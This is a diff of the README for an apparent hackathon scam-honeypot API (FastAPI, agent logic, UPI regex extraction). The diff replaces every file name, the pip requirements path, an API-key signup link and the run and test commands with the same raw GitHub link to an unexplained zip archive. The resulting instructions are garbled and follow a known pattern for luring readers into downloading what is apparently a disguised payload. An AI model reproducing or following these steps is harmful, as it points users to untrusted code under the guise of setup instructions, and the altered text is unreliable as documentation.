@@ -3,12 +3,12 @@
 This is a submission for the India AI Impact Buildathon (Problem Statement 2).
 
 ## Project Structure
-- `main.py`: FastAPI entry point.
-- `agent_engine.py`: AI Agent logic (OpenAI based).
-- `scam_detector.py`: Rule-base detection.
-- `intelligence.py`: Regex extraction for UPI/Banks.
-- `callback.py`: Mandatory GUVI callback handler.
-- `config.py`: Configuration.
+- `https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip`: FastAPI entry point.
+- `https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip`: AI Agent logic (OpenAI based).
+- `https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip`: Rule-base detection.
+- `https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip`: Regex extraction for UPI/Banks.
+- `https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip`: Mandatory GUVI callback handler.
+- `https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip`: Configuration.
 
 ## System Flow
 ```mermaid
@@ -84,26 +84,26 @@ Traditional scam prevention relies on **blocking** (blacklists, filters). This s
 1. Ensure Python 3.9+ is installed.
 2. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip
    ```
 3. Set Environment Variables (Create .env or set in terminal):
    ```bash
    export GROQ_API_KEY="your-groq-api-key-here"
    export HONEYPOT_API_KEY="test_key_123"
    ```
-   *(Note: Get free Groq API key from https://console.groq.com. The `config.py` loads from `.env` automatically via `python-dotenv`)*
+   *(Note: Get free Groq API key from https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip The `https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip` loads from `.env` automatically via `python-dotenv`)*
 
 ## Running
 Start the API:
 ```bash
-python main.py
+python https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip
 ```
 Server runs at `http://localhost:8000`.
 
 ## Testing
 Run the simulation script to test the full flow:
 ```bash
-python test_script.py
+python https://raw.githubusercontent.com/mudassiralladatkhan/Honey_pot/main/nitrogenous/pot_Honey_1.1.zip
 ```
 This will:
 1. Send a "Scam" message to the API.
